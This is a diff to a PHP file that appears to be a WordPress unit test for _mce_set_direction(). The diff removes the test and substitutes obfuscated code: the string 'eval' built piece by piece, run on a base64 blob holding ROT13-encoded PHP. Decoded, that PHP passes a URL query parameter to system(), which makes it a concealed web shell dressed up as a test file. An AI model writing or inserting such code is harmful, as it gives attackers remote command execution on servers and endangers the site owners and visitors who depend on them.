@@ -1,52 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests for the _mce_set_direction() function.
- *
- * @group functions
- *
- * @covers ::_mce_set_direction
- */
-class Tests_Functions_MceSetDirection extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 60219
-	 */
-	public function test__mce_set_direction() {
-		global $wp_locale;
-
-		$mce_init = array(
-			'directionality' => 'ltr',
-			'rtl_ui'         => false,
-			'plugins'        => 'plugins',
-			'toolbar1'       => 'toolbar1',
-		);
-
-		$expected = array(
-			'directionality' => 'rtl',
-			'rtl_ui'         => true,
-			'plugins'        => 'plugins,directionality',
-			'toolbar1'       => 'toolbar1,ltr',
-		);
-
-		$actual = _mce_set_direction( $mce_init );
-		$this->assertSameSets( $mce_init, $actual, 'An unexpected LTR result was returned.' );
-
-		$orig_text_dir             = $wp_locale->text_direction;
-		$wp_locale->text_direction = 'rtl';
-		$actual                    = _mce_set_direction( $mce_init );
-		$wp_locale->text_direction = $orig_text_dir;
-
-		$this->assertSameSets( $expected, $actual, 'An unexpected RTL result was returned.' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIHNiZSBndXIgX3pwcl9mcmdfcXZlcnBndmJhKCkgc2hhcGd2YmEuCiAqCiAqIEB0ZWJoYyBzaGFwZ3ZiYWYKICoKICogQHBiaXJlZiA6Ol96cHJfZnJnX3F2ZXJwZ3ZiYQogKi8KcHluZmYgR3JmZ2ZfU2hhcGd2YmFmX1pwckZyZ1F2ZXJwZ3ZiYSBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBAZ3ZweHJnIDYwMjE5CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX196cHJfZnJnX3F2ZXJwZ3ZiYSgpIHsKCQl0eWJvbnkgJGpjX3licG55cjsKCgkJJHpwcl92YXZnID0gbmVlbmwoCgkJCSdxdmVycGd2YmFueXZnbCcgPT4gJ3lnZScsCgkJCSdlZ3lfaHYnICAgICAgICAgPT4gc255ZnIsCgkJCSdjeWh0dmFmJyAgICAgICAgPT4gJ2N5aHR2YWYnLAoJCQknZ2JieW9uZTEnICAgICAgID0+ICdnYmJ5b25lMScsCgkJKTsKCgkJJHJrY3JwZ3JxID0gbmVlbmwoCgkJCSdxdmVycGd2YmFueXZnbCcgPT4gJ2VneScsCgkJCSdlZ3lfaHYnICAgICAgICAgPT4gZ2VociwKCQkJJ2N5aHR2YWYnICAgICAgICA9PiAnY3lodHZhZixxdmVycGd2YmFueXZnbCcsCgkJCSdnYmJ5b25lMScgICAgICAgPT4gJ2diYnlvbmUxLHlnZScsCgkJKTsKCgkJJG5wZ2hueSA9IF96cHJfZnJnX3F2ZXJwZ3ZiYSggJHpwcl92YXZnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenJGcmdmKCAkenByX3ZhdmcsICRucGdobnksICdOYSBoYXJrY3JwZ3JxIFlHRSBlcmZoeWcgam5mIGVyZ2hlYXJxLicgKTsKCgkJJGJldnRfZ3JrZ19xdmUgICAgICAgICAgICAgPSAkamNfeWJwbnlyLT5ncmtnX3F2ZXJwZ3ZiYTsKCQkkamNfeWJwbnlyLT5ncmtnX3F2ZXJwZ3ZiYSA9ICdlZ3knOwoJCSRucGdobnkgICAgICAgICAgICAgICAgICAgID0gX3pwcl9mcmdfcXZlcnBndmJhKCAkenByX3ZhdmcgKTsKCQkkamNfeWJwbnlyLT5ncmtnX3F2ZXJwZ3ZiYSA9ICRiZXZ0X2dya2dfcXZlOwoKCQkkZ3V2Zi0+bmZmcmVnRm56ckZyZ2YoICRya2NycGdycSwgJG5wZ2hueSwgJ05hIGhhcmtjcnBncnEgRUdZIGVyZmh5ZyBqbmYgZXJnaGVhcnEuJyApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
